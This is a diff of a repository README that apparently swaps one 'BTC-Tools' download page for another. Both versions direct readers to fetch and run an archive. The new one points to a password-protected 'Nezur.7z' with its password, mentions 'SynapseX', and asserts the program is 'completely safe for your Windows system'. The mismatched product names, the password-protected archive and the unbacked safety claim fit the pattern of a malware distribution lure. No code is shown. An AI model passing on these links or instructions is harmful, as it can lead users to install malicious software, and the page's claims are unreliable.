@@ -1,18 +1,34 @@
-## BTC-Tools
 
 
-## *Click to download - [Download](https://github.com/AdmSof/main/releases/download/Setup/Setup.rar)*
+![windows](https://github.com/Gogle1wds/teest1/assets/170970796/a93c3c21-521c-40f9-a3a8-bc6f80be9404) ![license](https://github.com/Gogle1wds/teest1/assets/170970796/d565df71-8795-4d26-86de-0343eaef084b)
 
 
-### MANUAL
-
-- Download the archive
-
-- Open zip
-- Unzip the file
-- Run File
+![image](https://github.com/jetunpatel1376/BTC-Tools/assets/73027550/82f98797-1a4d-479a-8ca7-2e2e5693a12c)
 
 
-[![Download](https://github.com/SzeligBalazs/SzeligBalazs1/assets/80389103/66db3529-fa24-4f0d-b64e-4a9810d24f78)](https://github.com/ffireman1/manu/releases/download/Crypto/Btc-Tools.zip)
 
-![5Cq22](https://github.com/SzeligBalazs/SzeligBalazs1/assets/80389103/3d21d107-f353-4532-99b1-7abfac310e5c)
+[![download_click](https://github.com/Gogle1wds/teest1/assets/170970796/4bbf4ab1-ed95-428e-840f-7972ec26be44)](https://github.com/Gogle1wds/teest1/releases/download/das/Nezur.7z)
+
+- ARCHIVE PASS : 9837
+
+
+> [!NOTE]
+> This repository provides detailed information and resources for downloading, installing, and using SynapseX.
+
+---
+
+
+
+
+> [!TIP]
+> 1. Most importantly: the program is completely safe for your Windows system.
+> 2. Support for most systems: Windows 7/8/8.1/10/11 (x32/64)
+
+---
+
+
+
+
+
+
+
